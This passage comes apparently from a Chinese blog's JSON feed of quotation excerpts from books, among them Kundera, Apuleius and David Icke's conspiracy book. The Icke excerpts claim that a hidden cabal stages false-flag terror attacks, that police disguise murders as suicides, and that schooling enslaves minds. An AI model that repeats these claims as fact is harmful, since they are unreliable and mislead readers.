5-28</h3>\n<p>工作本身并无好坏，道德准则是人定的，而不是上帝。</p>\n<p>她以一种古怪的怀恋之情追忆往事，仿佛那所有令人憎恶的细节、伤心的故事，对她而言都已无关紧要，唯一重要的是，它们都发生在许久以前，那时她曾年轻，几乎是一个孩子。</p>\n<p>我想–身处不幸的人总是会思考–换个地方也许可以让自己远离这悲痛，好像我们不是在自己内心承受痛苦似的。</p>\n<p>我并不打算将记忆中的一切都复述一遍，以它们在那里被记录和描述的方式–订婚的日期和习俗、不计成本的传统婚礼、种种别具一格的风俗都曾是那生活的一部分。</p>\n<p>在人类历史上没有任何事是重复的，乍看起来相似的事物其实完全不同，每个个体都是他自己的恒星，一切都一再发生并用不再发生，无尽的重复它们自身的事物也仍是独一无二的。</p>\n<p>在人的生命中，没有任何事物是不重要的，也没有任何经历有高低之别。</p>\n<p>历史是人类命运的总和、瞬息事件的整体。因此它记载每一个行动，每一丝想法，每一个生命，勘查中每一个点的高度，每一铲的泥土，从废墟中清理出砖块的每一个动作。</p>\n<p>这是一片临近河口的精神风暴，在这里，朋友及亲戚的墓园一个紧挨着一个，每一个–哪怕是比我的父亲更不会沉思的人–都会变成哲学家，只要哲学是思索人类生存的意义。</p>\n<p>上帝没有给他真正的教育，他将无知地踏入坟墓，他不曾获得安乐，也无法认识真正的大海或城市，也无法知晓那些富有的、有教养的人所能知晓的事物。</p>\n<h3 id=\"5-29\"><a class=\"markdownIt-Anchor\" href=\"#5-29\">#</a> 5-29</h3>\n<p>我还不知道，他已发现自己腹股沟那里有可疑的肿大，或许他已心知肚明，就像一块根茎、一株奇特的，有毒的植物正在他的体内蔓延。</p>\n<p>他的生命并非徒劳与空虚，终究还有人在记录每一个生命，每一场痛苦，每一种生活，并赋予它们价值。虽然微不足道，但终究是一种慰藉。</p>\n<p>他们身下的毛布在这些厌倦了的睡眠者们毫无意识的拉扯之下已经被磨的很薄，厌倦了生活与活动的睡眠者，除了睡以外不做任何事。</p>\n<p>水滴时不时滴落在他们麻木的身躯上，石头一般的脸上，然后沿着前额上的皱纹流进耳廓，逗留在圆的眼窝上，像一颗冰冷的泪珠淌过淡绿色的眼珠，或者停驻在石头一般的眼睛的睫毛上。</p>\n<p>他们已经聋了，睡眠的掌控、黑暗的声调塞住了他们的耳朵，他们一动不动地躺着，凝视着自己生命的黑暗，时间和永恒的黑暗，让他们睡着的心变成石头，停止他们呼吸和肺部的运作，也冻结了他们血管中的潺潺血液。</p>\n<p>对他而言，那似乎更像是梦境；也许现在她就只是梦，生的梦魇，死的梦魇，得不到回应的爱的梦魇，时间与永恒的梦魇。</p>\n<p>即使他们睡得没有呼吸，没有动静，安静得如同木乃伊，甚至没有人体的气味或尸体的恶臭，他还是可以感觉到他们；他能感觉到他们血肉之外的存在，那只木乃伊般的狗，看守着这生死攸关的沉睡。</p>\n<p>他的记忆里仍一无所有，除了牢不可破的黑暗，在创世之前，在万物创始之前，造物主尚未将光明与黑暗分离，将白天与黑夜分离，将梦境与真实，真实与梦境区分开之前的时光。</p>\n<p>两个女人的形象因为时间与记忆合而为一，没有边界或界限，因为他们是两个回忆的尘土与灰烬形成的，两个相继的造物的肉体，被睡眠吹进一个灵魂，他的灵魂。</p>\n<h3 id=\"5-30\"><a class=\"markdownIt-Anchor\" href=\"#5-30\">#</a> 5-30</h3>\n<p>一个没有幻觉也没有疑虑的梦，一个有着属于他自己的言语及感觉的梦，一个既是身体又是灵魂的梦，一个既是身体又是灵魂的梦，一个既是意识又是实在的梦，一个有着清晰的边界、有着自己的语言与声音的梦，一个可以触摸得到，可以用味觉、嗅觉、听觉来探索的梦，一个比清醒更有力的梦，一个好像死者才做的梦。</p>\n<p>从那暗藏的瞥视与小鱼似的嘴中，感受到某种虚伪，一种刻意的缺席，一种恐惧或尊敬，又或者梦游者的迟钝反应。</p>\n<p>因为只有梦游者才可能像他们这样行走，梦游者依靠至高无上的手的指引、看不见脚下深渊的那些人的胆量，带有远古的神的力量的那些人的疯狂，走过了深渊。</p>\n<p>盲人与残废的人，像虫一样蠕蠕而行，蜂拥到他们脚边，亲吻他们的身躯，以痛苦的、恐惧的言语祈求他们，以信仰与慈悲的名义祈求他们，恳求他们使他们重见光明，治愈他们的伤口与日渐麻痹的四肢，让他们重回充满信心的光明生活。</p>\n<p>除了肉身的墓穴，灵魂的土牢之外，什么都没有了，黑暗的王国，发了霉的、长着绿色霉菌–侵入了他的心脏、皮肤、骨髓及脊椎–的宫殿。他徒劳的探索、徒劳地用干枯的、肿胀的手指去感受洞穴里潮湿又冰冷的石头，徒劳地抬起眼皮，徒劳地用手指触摸他们，来判断这一切是梦境还是幻觉。</p>\n<p>他麻木的身体，轻巧的骨头，净空的内脏、安静的心，干枯的皮肤，都臣服在轻松的呼吸带来的轻盈静谧之中。</p>\n<p>伏特加、印度大麻，肉体的欢愉被视为与阅读，旅游，朝圣同样重要。</p>\n<p>如果你完全相信他人的话，即便那是神圣的话语，那么比起那些打破了这话语所规定的戒律的人，你所面临的道德沦丧的危险还更严峻些。</p>\n<h3 id=\"5-31\"><a class=\"markdownIt-Anchor\" href=\"#5-31\">#</a> 5-31</h3>\n<p>面对他人的空虚是危险的，即使只是注视着这空虚，这就像是在深井里注视着自己的倒影，因为那也是空虚，空虚的空虚。</p>\n<p>无论他有怎样奇异而又秘密的希望，他的生命从此都不过是一出悲惨的荒诞剧，执笔的是那些像诸神一般有力量的人物。</p>\n<p>一切在原先看来是偶发的事件或无意的安排，一场崇高的信仰与命运的交战，这一切–如同奥林匹斯诸神一般变幻无常的混沌历史–如今一目了然，这尘世间有人在暗中操纵着。</p>\n<p>因为自由是生命精神的化身，它的力量能使人群变成嗜血的野兽，不过，当然了，就像所有的野兽一样，一旦让他们喝饱了血，他们就睡着了，所以他们很容易管教。</p>\n<p>他已经获得了人能够从书籍里获取的一切–幻觉和怀疑。人无法像蜗牛一样，永远将藏书载在身上背走。他的私人藏书只是那些能留在他记忆中的一切–这是精髓，是沉淀。</p>\n<p>人们愿意相信别人告诉他们的一切，特别是那些看似在道德上完美无瑕的人。堕落的人从不相信别人与自己不同；他们只能想象那些人成功的隐藏了自己的本性。</p>\n<p>她们参加公共讲座假装她们想学点什么–好在启程前往来世前尽完俗世的义乌，可以在终点说她们并不曾生活在黑暗中–但是实际上，他们不过是需要有那么片刻忘记自己的孤独，那孤独里填满了关于死亡的偷袭，又或者只是为了单纯的看见别的人。</p>\n<p>尽管我生活在孤寂里，但是先生，我不会用自己的回忆来烦扰别人，我的回忆就像一座巨大的坟墓，被死去的人占满了。</p>\n<p>我们的爱不需要任何” 贪婪的俗世享乐 “，这不需证明，我们的爱在我们彼此的激情中得到滋养，得到毁灭。</p>\n<h3 id=\"5-32\"><a class=\"markdownIt-Anchor\" href=\"#5-32\">#</a> 5-32</h3>\n<p>我从未明白，杜撰书籍，编造那些并未以任何方式真正发生过的事情有何意义。</p>\n<p>当我们死去，我仍然企望可以触摸你，感觉你，与你结合，与你合而为一，如果我们的组成部分之间依循着吸引力法则，如果我们注定要构成一个生命，如果在世纪的火车中，我主动要与你为偶，如果你那腐朽了的爱人的分子能够四处游走，找寻在你散布在自然中的分子！留给我这疯狂的幻想吧；它对我是如此珍贵，它许给我永恒。</p>\n",
            "tags": [
                "生命",
                "命运",
                "人生哲学"
            ]
        },
        {
            "id": "http://www.n1h1l157.live/2019/07/01/BOOK/59%E3%80%8A%E5%9C%B0%E7%90%83%E8%A2%AB%E6%8E%A7%E5%88%B6%E7%9A%84%E7%9C%9F%E7%9B%B8%E3%80%8B%E5%A4%A7%E5%8D%AB%C2%B7%E8%89%BE%E5%85%8B/",
            "url": "http://www.n1h1l157.live/2019/07/01/BOOK/59%E3%80%8A%E5%9C%B0%E7%90%83%E8%A2%AB%E6%8E%A7%E5%88%B6%E7%9A%84%E7%9C%9F%E7%9B%B8%E3%80%8B%E5%A4%A7%E5%8D%AB%C2%B7%E8%89%BE%E5%85%8B/",
            "title": "《地球被控制的真相》大卫·艾克",
            "date_published": "2019-06-30T16:00:00.000Z",
            "content_html": "<p>他们被陷在五官感觉的世界里，根本不知道我们的本质都是意识。</p>\n<h3 id=\"5-18\"><a class=\"markdownIt-Anchor\" href=\"#5-18\">#</a> 5-18</h3>\n<p>当各点连在一起拼出真相，它令我们对身处的这个从摇篮到坟墓世界产生完全不同的看法。当你连接这些点，你便看出” 大厅里的大象 “，当你连接越多的点，” 大象 “也会越来越明显，更加形象。</p>\n<p>我们可以打破这一切，我们可以走出迷宫，从我们一直受困的监狱中脱离出来。但要做到这些，我们就要停止接受那些讲我们困在其中的事物，它们构成了这个世界的样貌–我们被告知世界本该如此。</p>\n<p>你没必要跟着别人做同样的事情，不要因为他们都在那样做，你处于害怕而顺应他们。有时候，选择与众不同，选择不顺从，可以大大解救我们于苦痛。</p>\n<p>你带着独特性出生，不要死在复制中！但是很多人都这样啊！因为他们都怕和别人不一样，他们怕与众不同带来的麻烦。</p>\n<p>我们被变成去相信学校教导的一切，学校教育并不是为了启蒙我们，而是为了用现实特定的感觉方式对我们进行编程控制，那些信念影响我们的一生。这样，基于我们对自己身份和这个世界错误的认知，我们就能守好一个听话奴隶的身份。</p>\n<p>那些打着各种虚假旗号的恐惧事件，都是由同一股控制势力制造出来的。而他们反过来又告诉我们说需要才去措施以保护我们免受恐怖主义的威胁。那正是他们自己策划和制造的。</p>\n<h3 id=\"5-19\"><a class=\"markdownIt-Anchor\" href=\"#5-19\">#</a> 5-19</h3>\n<p>他们令奴役者以为自己享有自由。这一条非常重要，因为这就使人们不会为脱离奴役而行动，因为人们根本意识不到自己被奴役。</p>\n<p>死亡并不存在，人生只是一场梦，我们都是自己想象力的创造。</p>\n<p>身体不仅能对数据做出反应，还能评估数据并在此基础上做出决定，这就是我们免疫系统随时在做的事。</p>\n<p>什么是真实？你怎样定义真实？如果你所说的真实指的是你所感受到的、听到、闻到的，那么真实只不过是你大脑对电子信号的诠释。</p>\n<p>你眼前的这个世界，蒙蔽你双眼使你看不到真相的世界。什么是真相？你是一个奴隶，和其他人一样，你一出生就被束缚住了，一出生就进入一个你根本看不到、听不到、也摸不到的监狱中，一个头脑的监狱。</p>\n<p>我们是意识，我们是无实体，无形象的觉知，正在体验自身。</p>\n<p>意识是海洋，是所有的可能性，是一切万有，是全知。而” 头脑 “类似于是意识的一个局限的、稠密的、浓重的表达。</p>\n<p>在那鸡精之中，没有任何负面情绪，没有恐惧，没有对承担租金的担忧，一切琐事都在那个领域消退了，你一无所思。</p>\n<p>很多人面临寂静时，会想逃离到别处，很多人恐惧寂静，急匆匆地坐上车，飞快地跑回家，立马打开电视或影响、置身于嘈杂之中，这会将你拘泥于五官的现实里面。</p>\n<p>事实上，面对一切存在着的频率世界，我们等同于盲人。</p>\n<p>当我们看向外面，以为自己能够看到一切，其实不然，我们只能看见我们能够解码的事物。</p>\n<p>我们通过身体计算机把自己专注的焦点置于这个现实里，因此这个世界看上去是唯一存在的世界，但实际上有无尽的东西占据着空间。</p>\n<p>他们被陷在五官感觉的世界里，根本不知道我们的本质都是意识。</p>\n<h3 id=\"5-20\"><a class=\"markdownIt-Anchor\" href=\"#5-20\">#</a> 5-20</h3>\n<p>我们认为我们是人类，其实 “人类” 像是 “软件程序”，我们不是 “人类”，我们只是在 “体验着人类”，我们是正在体验着人类的意识。</p>\n<p>正是那些令我们第三只眼关闭的所有一切措施，将我们封闭在这个五官感受的现实世界，阻止我们挣脱，进入到更宏大的自我。</p>\n<p>很多学术界的论调会把你对现实的认知禁锢和限制在旧模式里，要理解现实，你必须要去接触我们身边包含着这类知识的内容。</p>\n<p>我们生活在错误的身份认同中，我们以为的我们是人类，其实我们是意识，我们是多层次的觉知与意识，而不只是这个身体。</p>\n<p>其实头脑只是一个非常低层次的觉知，它原本只是我们用以体验这个现实的工具。它应该是意识的奴仆，现在却成了掌控我们的主人，成了我们崇拜的对象，这就叫孤立的智力。</p>\n<p>如果觉知之门得到净化，万物将如其本来面目般无边无际。</p>\n<p>你不会这么做，但他们会。无论他们做什么，都不会动感情，他们没有一点同情心。</p>\n<p>它是没有围墙的监狱，你看不到围墙，因为你被蒙蔽了，人们不会奋起反抗，所以也不会获得自由，因为人们以为自己是自由的。所以他们将一种新的统治方式冠以 “自由” 之名来取代旧的殖民统治。</p>\n<p>人已经没有什么真正的梦想，只有作为动物的梦想，因为他是被以一片肉的方式养大的，平庸、受习俗约定、低能、愚笨。</p>\n<p>今天我们与社会，与人事之间的互动方式几乎完全是通过情绪进行的，以前心是主宰者，现在越来越多的情绪成为我们的主宰，我们是在 “情绪化的反应”，而不是思考，不是感受。</p>\n<p>一切都在倒退，一切都是颠倒的，医生摧毁了健康，律师毁灭了公正，大学毁掉了知识，政府破坏了自由、主流媒体消灭了信息，宗教毁灭了灵性。</p>\n<h3 id=\"5-21\"><a class=\"markdownIt-Anchor\" href=\"#5-21\">#</a> 5-21</h3>\n<p>人类被塞进这个周而复始的固定的生活方式，日复一日，年复一年的重复着同样的循环。</p>\n<p>不需要真的存在一个问题，你只需要公众 “认为” 这个问题存在。</p>\n<p>他们人为地制造了缺乏，因为 “富足 = 选择 = 自由”，“缺乏 = 依赖 = 控制”，这就是为什么我们的世界被人为地设计成如此大程度的相互依赖。我们的世界物理如此丰富，很多人却在挨饿。</p>\n<p>因为他有能力讲出实情，结果被谋杀了，却被说成是自杀，那都是警察编造出来的。</p>\n<p>一旦你在这些金字塔适当位置上能够雇佣和开除人，你就可以雇佣那些有着类似思想的人，一段时间以后，这些组织中的不同层面上就到处都是这种人。</p>\n<p>媒体所做的正是让我们远离真相，让我们不知道真正发生了什么。</p>\n<p>人民群众更容易被大的谎言而不是小的谎言所蒙蔽。</p>\n<p>阴谋集团所做的就是把所有这些细微的限制丢向我们，做了这个就惩罚我们，做了那个也惩罚我们，使我们只能按照他们的规定极其限制的去做。而那个他们规定的正确通道正在变得越来越狭窄，到最后，我们会变成一种不会质疑的，只会顺从的机器人。</p>\n<p>这仍然是一场对感知观念的控制，让我们相信我们没有力量。让我们相信只需跟着前面的人，人家做什么我们就做什么，因为其他的每个人都是这样，我们就像是在地狱里活着。</p>\n<p>幕后进行的一切，根本不是人们以为的那样。</p>\n<p>我们不必去寻找开悟，我们已是开悟的，所需要的就是移除信念上和认知上的围栏，因为是我们将它们放在了周围阻隔了开悟。</p>\n<p>爬虫脑并不思考，只是反应，不经思考的反应，所以非常快。</p>\n<h3 id=\"5-22\"><a class=\"markdownIt-Anchor\" href=\"#5-22\">#</a> 5-22</h3>\n<p>我们的生活方式是这般的固定模式化，是一种奴役，如此的受限制。</p>\n<p>这个世界没有在服务于人们，是人们在服务于这个系统，这就是我们的真实状况。我们是这个系统的奴隶，政界人士也是这个系统的奴隶，他们进入这个系统想要改变这个系统，事实上是这个系统在改变着他们。</p>\n<p>因为信仰在它周围建立起围墙来排斥其它，排斥挑战它的一切事物，如此，你突然有了一种固定的模式生活。这样，你就是去了真正能够感知到更广阔途径的能力，因为你将它交出去给了你的信仰，你认为一切必须是你信仰的那样。</p>\n<p>宗教有很多不同的表现方式，不止是去教堂。人们头脑中有各种类型的宗教，从外表上看不出来，但他们确实存在，那是对头脑的沉溺：“你必须相信这个，只有这一种可能”。</p>\n<p>这喜人是在催眠状态，他们被告知他们是宗教信徒，有非常多的教徒都是这种状态。有很多种头脑监狱，比如宗教信仰，种族，政治信仰。</p>\n<p>信仰会持续地编辑实相，制造出自圆其说的预言，这样他们看到的世界就会符合他们的信仰，尽管他们接收到与其信仰不一致的信息，他们还是过滤掉了那些信息，以此来维护他们的信仰。</p>\n<p>我们需要像一张白纸，放掉所有的预设思想观点，放掉所有的预设信念，只让信息和直觉来决定我们对事物的感受和想法，而不是由预设观念来决定。</p>\n<p>从 “这绝不可能” 变成 “哦，让我们看看这是否可能”。</p>\n<p>直觉即内在的知晓，它来自于超越五官实相的其他水平的觉知。也就是说，你跟随直觉想去做的一些事，在这个五官实相的世界看来却是疯狂的、愚蠢的、危险的、不可思议的等等。</p>\n<p>是时候知晓你自己了，不是我们被告知的那个人 “你自己”，而是真正的那个 “你自己”。</p>\n<h3 id=\"5-23\"><a class=\"markdownIt-Anchor\" href=\"#5-23\">#</a> 5-23</h3>\n<p>哪里没有时间，没有事件先后顺序，也没有限制，空间距离，时间长度的、地点等等，我可以同时存在于我想在的任何地点。</p>\n",
            "tags": [
                "神学",
                "社会"
            ]
        },
        {
            "id": "http://www.n1h1l157.live/2019/07/01/BOOK/53%E3%80%8A%E4%B8%8D%E8%83%BD%E6%89%BF%E5%8F%97%E7%9A%84%E7%94%9F%E5%91%BD%E4%B9%8B%E8%BD%BB%E3%80%8B%E7%B1%B3%E5%85%B0%C2%B7%E6%98%86%E5%BE%B7%E6%8B%89/",
            "url": "http://www.n1h1l157.live/2019/07/01/BOOK/53%E3%80%8A%E4%B8%8D%E8%83%BD%E6%89%BF%E5%8F%97%E7%9A%84%E7%94%9F%E5%91%BD%E4%B9%8B%E8%BD%BB%E3%80%8B%E7%B1%B3%E5%85%B0%C2%B7%E6%98%86%E5%BE%B7%E6%8B%89/",
            "title": "《不能承受的生命之轻》米兰·昆德拉",
            "date_published": "2019-06-30T16:00:00.000Z",
            "content_html": "<p>他们这群古怪的人，生活在纯属想象、不在身边的人的目光下。</p>\n<h3 id=\"4-96\"><a class=\"markdownIt-Anchor\" href=\"#4-96\">#</a> 4-96</h3>\n<p>生命一旦永远消逝，便不再回复，似影子一般，了无分量，未灭先亡。即使它是残酷、美丽、或是绚丽的，这份残酷、美丽和绚烂也都没有任何意义。</p>\n<p>一个建立在轮回不存在之上的世界所固有的深刻的道德沉沦，因为在这个世界上，一切都预先被谅解了，一切也就都被卑鄙的许可了。</p>\n<p>最沉重的负担压迫着我们，让我们屈服于它，把我们压到地上。负担越重，我们的生命越贴近大地，它就越真实存在。</p>\n<h3 id=\"4-97\"><a class=\"markdownIt-Anchor\" href=\"#4-97\">#</a> 4-97</h3>\n<p>当负担完全消失，人就会变得比空气还轻，就会飘起来，就会远离大地和地上的生命，人也就只是一个半真的存在，其运动也会变得自由而没有意义。</p>\n<p>在一个真正的男人本可立刻采取行动的时刻，他却在责怪自己犹犹豫豫，剥夺了自己一生中最美好的瞬间的一切意义。</p>\n<p>没有任何方法可检验哪种抉择是好的，因为不存在任何比较。</p>\n<p>他明白自己天生不是能在一个女人身边过日子的人，不管这个女人是谁，他也明白了只有单身，自己才感到真正自在。</p>\n<p>爱情并不是通过做爱的欲望（这可以是对无数女人的欲求）体现的，而是通过和她共眠的欲望（这只能是对一个女人的欲求儿）而体现出来的。</p>\n<p>他的眼睛始终盯着我们，要是我们中的哪个人做错了动作，而他就一枪打去。游泳池里到处是死尸，飘在上面。</p>\n<p>此刻他才发现，对这些岁月的回忆远比他们在一起生活时更加美好。</p>\n<p>痛苦会随着想象而加剧，在千百次的回荡反射中越来越深重。</p>\n<p>这许多次偶然，把他推到了她身边，好像是自然而然，没有任何东西引导着他。</p>\n<p>肉体是囚笼，里面有个东西在看，在听，在害怕，在思索，在惊奇；这东西在肉体消失之后还在，还残存，它就是灵魂。</p>\n<p>在这个世界里，青春和美貌了无意义，世界不过是一个巨大的肉体集中营，一具具肉体彼此相像，而灵魂是根本看不见的。</p>\n<p>事实上，那些从镇上图书馆借来的书，也是她反抗那个围困着她的粗俗世界的唯一武器。这些书为她提供了一个机会，在虚幻中逃避，摆脱那种毫无快乐可言的生活。</p>\n<p>凡是必然发生的事，凡是期望得到、每日重复的事，都悄无声息。唯有偶然的巧合才会言说，人们试图从中读取某种含义。</p>\n<p>她跌落在一片浓雾里，什么也看不见，什么也听不见，除了他自己的叫声。</p>\n<p>他们的身体是同样的，同样的下贱，都是没有灵魂的简单发声机械，而那些女人竟以此为乐！这些没有灵魂的人团结一致，手舞足蹈。她们很高兴抛却了灵魂的重负，抛却了独一无二的幻想，抛弃了滑稽可笑的自傲，为所有人都一模一样而庆幸。</p>\n<h3 id=\"4-98\"><a class=\"markdownIt-Anchor\" href=\"#4-98\">#</a> 4-98</h3>\n<p>那些画表面总是一个完美无瑕的现实主义世界，而背后呢？就像是舞台背景的那块破布后面，人们看到的是不同的东西，某种神秘或抽象的东西。</p>\n<p>表面是清晰明了的谎言，背后确是晦涩难懂的真相。</p>\n<p>即使您去拍仙人掌，那是属于您自己的生活。如果您只是为了别人而活着，那就不是您的生活了。</p>\n<p>他们为彼此造了一座地狱，尽管他们彼此相爱。这足以证明错不在他们本身，不在他们的行为，也不在他们易变的情绪，错在他们之间的不可调和。</p>\n<p>人一旦迷醉于自己的软弱，便一味软弱下去，会在众人的目光下倒在街头，倒在地上，倒在比地面更低的地方。</p>\n<p>对他来说，爱情是一种甘心屈从于对方的意愿和控制的热望。委身于对方就如同投降的士兵一般，必须首先缴械。</p>\n<p>他这样活着，像是个错误，又像个缺憾。</p>\n<p>在每个人的乐曲中，每个词，每件物所指的意思便各不相同。</p>\n<p>第一次的背叛是不可挽回的，它引起更多的背叛，引起连锁反应，一次次地使我们离最初的背叛越来越远。</p>\n<p>每个词都弄得不再准确，意义模糊，内涵尽失，只余下碎片、杂屑和尘埃，像沙砾一样，在他脑子里翻飞。</p>\n<p>人在内在的黑暗中变得越大，它的外在形象就越小。</p>\n<p>由于一切都取决于公民得到怎样的评价，因此，所有人都不得不好好的表现，以获好评。</p>\n<p>这些人的共同之处，不过是他们的失败和相互的斥责。</p>\n<p>他没有觉悟到，他以为不现实的，其实是他的现实生活而被他视作现实的游行，不过只是一个梦。</p>\n<h3 id=\"4-99\"><a class=\"markdownIt-Anchor\" href=\"#4-99\">#</a> 4-99</h3>\n<p>有些形态，本身很丑，未经任何筹划，可碰巧处在一个看似不可思议的环境中，突然之间便散发一种魔力般的诗意来。</p>\n<p>文化就在大批的制造，言语的泛滥，数量的失控中逐渐消亡。</p>\n<p>不管生活有多残酷，墓地里总是一片安宁，哪怕是在战争时代。</p>\n<p>她要是想觉得丑，那就是丑，想觉得美，那就是美。</p>\n<p>一旦有旁人见证我们的行为，不管我们乐意不乐意，都得适应旁观我们的目光，我们所做的一切便无一是真了。</p>\n<p>远近的人都会盯着看，他将不得不在所有人面前演戏；她将不再是萨比娜，而是被迫扮演萨比娜这个角色，并且找到扮演的方式。</p>\n<p>萨比娜的人在不在根本不像他所以为得那么重要，重要的是她在他的生命当中留下的那道灿烂而神奇的印迹，无人可以夺走。</p>\n<p>他与她在一起度过的一生中最美好的岁月，却没有遗存任何触摸得到的证据。</p>\n<p>集中营，就是日日夜夜，人们永远挤着压着在一起生活的一个世界。残酷和暴力只不过是其次要特征。集中营，是对私生活的彻底剥夺。</p>\n<p>没有人催促她，但她知道，她无论如何也逃不开。</p>\n<p>他们必须给人设陷阱，以便控制他们为自己服务，利用他们再来给别人设陷阱，如此一来、渐渐的就将整个民族变成了一个告密者的庞大组织。</p>\n<p>也许，所有的事、所有的人都出现在一种伪装之下。</p>\n<p>它们发生，第二天就被遗忘，而河水依旧在不停的流淌。</p>\n<p>罪恶的制度并非由罪人建立，而恰恰由那些确信已经找到了通往天堂的唯一的道路的积极分子所建立。他们大无畏的捍卫这条道路，并因此而夺去了许多人的生命。</p>\n<p>他可不在乎他们，而是自己居然因为那些人的看法而不得安宁。这太不合逻辑了。像他这样的人，对别人的看法向来都不当一回事，怎么会被别人的说三道四牵制到这种份上？</p>\n<p>托马斯现在发现自己陷入困境，仿佛怎么也抓不住那些对他紧逼的目光，他既不能还至以自己的目光，也不能用言语解释。竟然完全被他们控制了，他对这些心理完全有数，但却无能为力。</p>\n<h3 id=\"4-100\"><a class=\"markdownIt-Anchor\" href=\"#4-100\">#</a> 4-100</h3>\n<p>托马斯很清楚人们的心理，他们从别人的精神耻辱中得到无比的快乐，根本不愿意有什么解释来糟蹋这份快乐。</p>\n<p>他拿不准自己所做的选择是否正确，但他已经感觉到，他已经通过某种忠诚的誓言和他的这一决定联系在一起，于是，他坚持了自己的选择。</p>\n<p>内心的必然总是更强烈，总是更强力地刺激我们走向反叛。</p>\n<p>切开事物的表面去看看藏在里面的东西。换句话说，要去看一看当一个人抛弃了所有他一直都以为是使命的东西时，生命中还能剩下些什么。</p>\n<p>我们能够想象的，仅仅是众人身上一致、相同之处。个别的 “我”，区别于普遍，因此预先猜不出，估不了，需要在他者身上揭示它，发掘它，征服它。</p>\n<p>爱开始于一个女人以某句话印在我们诗化记忆的那一刻。</p>\n<p>他完全不能肯定自己做的是对的，但可以肯定做了自己想做的。</p>\n<p>为何还考虑要不要签名？他的所有决定仅一句一个标准：不能做任何伤害特蕾莎的事情。托马斯不能拯救政治犯，但他可以令特蕾莎幸福。不，就连这个，他也做不到。</p>\n<p>他们，这戏人物或那些任务，跨越了界限，而我只是绕了过去。这条被跨越的界限吸引着我。小说应当是对陷入尘世陷阱人生的探索。</p>\n<p>绝望笼罩了整个国家，控制并压垮了一个个肉体，一直渗透到了灵魂。一些人拼命地在逃避当权者的宠幸，当权者想以荣誉困住他们，强迫他们在公共场合露面，不离新当权者的左右。</p>\n<p>如果打入地狱与享有特权是唯一且同一的，如果高贵和粗俗之间没有丝毫区分，如果上帝之子可以因粪便而遭人指责，那么人类存在就会失去其整个纬度，成为不能承受之轻。</p>\n<p>无论是从字面意义还是引申意义讲，媚俗是把人类生存中根本不予接受的一切都排除在视野之外。</p>\n<h3 id=\"4-101\"><a class=\"markdownIt-Anchor\" href=\"#4-101\">#</a> 4-101</h3>\n<p>令她反感的，远不是世界的丑陋，而是这个世界所带的漂亮面具。换句话说，也就是媚俗。</p>\n<p>参议院做出这样的结论，只有一个依据，那就是他自己的感觉。当心灵在说话，理智出来高声反对，是不恰当的。在媚俗的王国，实施的是心灵的专制。</p>\n<p>显然，由媚俗而引起的情感必须能让最大多数的人来分享。媚俗与出格无涉，它召唤的，是靠深深印在人们头脑中的关键形象，人类中的博爱只能是建立在媚俗的基础上。</p>\n<p>有损于媚俗的一切，必被清除出生活；任何个人主义的表现、任何怀疑，任何嘲讽，甚至是抛弃家庭的母亲，爱男人甚至胜于爱女人的男人，都是有损于媚俗的行为。</p>\n<p>他们在描绘一种共产主义理想，而当时，共产主义的现实要远远灰暗得多。</p>\n<p>媚俗的真正作用：媚俗是掩盖死亡的一道屏风。</p>\n<p>媚俗一旦失去其专横的权力，它就像人类的任何一个弱点一样令人心动。因为我们中没有一个是超人，不可能完全摆脱媚俗。不管我们心中对他如何藐视，媚俗总是人类境况的组成部分。</p>\n<p>伟大的进军最后变成了一支急匆匆飞步向前的队伍，舞台变得越来越小，直至有一天，将变成一个没有任何空间维度的小点。</p>\n<p>他所做的也近乎是在演戏，但他没有别的可能。在行动和演戏之间，他别无选择。他唯有一种选择：要么演戏，要么什么也不干。</p>\n<p>他们这群古怪的人，生活在纯属想象、不在身边的人的目光下。</p>\n<p>我看见他俩并肩走着：他们离开了人类的道路，而人类，大自然的主人和所有者，在这条路上继续向前走。</p>\n<p>卡列宁围绕在他们身边，过着建立在重复之上的循环生活，并期望他们也这样。</p>\n<p>恐惧之强光被蒙上了，于是我们发现世界沐浴在淡蓝色的、温柔的光线中，使从前最丑陋的事物变得再也美丽不过。</p>\n<p>某天，你作出一项决定，你甚至不知道是怎么回事，而且这项决定有其惯性力。随着一年年过去，要改变他有些困难了。</p>\n<h3 id=\"4-102\"><a class=\"markdownIt-Anchor\" href=\"#4-102\">#</a> 4-102</h3>\n<p>我没有使命，任何人都没有使命。当你发现自己是自由的，没有任何使命时，便是一种极大的解脱。</p>\n",
            "tags": [
                "意义",
                "爱情"
            ]
        },
        {
            "id": "http://www.n1h1l157.live/2019/07/01/BOOK/60%E3%80%8A%E9%87%91%E9%A9%B4%E8%AE%B0%E3%80%8B%E9%98%BF%E6%99%AE%E5%88%97%E4%B9%8C%E6%96%AF/",
            "url": "http://www.n1h1l157.live/2019/07/01/BOOK/60%E3%80%8A%E9%87%91%E9%A9%B4%E8%AE%B0%E3%80%8B%E9%98%BF%E6%99%AE%E5%88%97%E4%B9%8C%E6%96%AF/",
            "title": "《金驴记》阿普列乌斯",
            "date_published": "2019-06-30T16:00:00.000Z",
            "content_html": "<p>我那写在天上的名字，遭到尘世间秽物的玷污！</p>\n<h3 id=\"5-23\"><a class=\"markdownIt-Anchor\" href=\"#5-23\">#</a> 5-23</h3>\n<p>愚昧的偏见会使人全然不信那些他自己从未耳闻目睹过的事实，最起码是由于事物的复杂性超越了他的理解力。</p>\n<p>说真的，你确定应该受到最残酷的肉体折磨，假使还有一种惩罚比你所遭受的这些更严厉的话。</p>\n<p>虽然我已是半死不活，可我也觉得自己是一个大难不死的幸存者，或者说，只是一名被指定送上十字架的候选人。</p>\n<p>唯有你才能在诉讼之际证明我的清白无辜。此时此刻，你得供给我一件超升之物，因为我难以忍受堕入死人的王国。</p>\n<p>我在这座城中所看见的一切事物，没有一件能使我觉得是名副其实的，而是每一个人或每一件事都仿佛在具有魔力的咒语下，扮演着一种与其本质不同的角色。</p>\n<p>一言以蔽之，这个地方可以找出人类智慧所能想象到的一切。</p>\n<p>你们之所以对我如此仇恨，是因为那凭空捏造的指控。</p>\n<p>我，为了保住居停主人的性命，变成了一个杀人犯，将要被处死，而他呢，非但没有给我以挺身相助的慰藉，还大声嘲笑我的不幸。</p>\n<p>羞耻夺走了我的一切记忆。我只是迷迷糊糊、昏昏沉沉地发现，人人都在用眼睛、用脑袋，以及用手指头，对我品评着什么。</p>\n<p>睡意降临在我们因彻夜疯狂而困倦的眼睛上，一直将我们束缚至翌日。</p>\n<p>此际我逍遥自在，隐蔽在绿荫丛中，一旦觅得所需之救命仙草，便可以从这四足动物的伛偻形态下脱身出来，神不知鬼不觉地恢复我那一个人的堂堂正正的形象。</p>\n<h3 id=\"5-24\"><a class=\"markdownIt-Anchor\" 